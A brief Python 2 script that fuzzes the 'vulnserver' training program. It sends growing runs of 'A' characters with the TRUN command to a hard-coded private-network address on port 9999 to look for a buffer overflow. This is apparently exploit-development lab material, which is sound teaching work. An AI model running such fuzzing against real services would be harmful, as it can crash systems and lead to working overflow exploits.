#! /usr/bin/python

import socket 
import sys

buffer = ["A"]
counter =  100
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	print "Fuzzing vulnserver with %s bytes " % len(string)
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect=s.connect(('192.168.43.112',9999))
	s.send(('TRUN /.:/' + string))
	s.close()
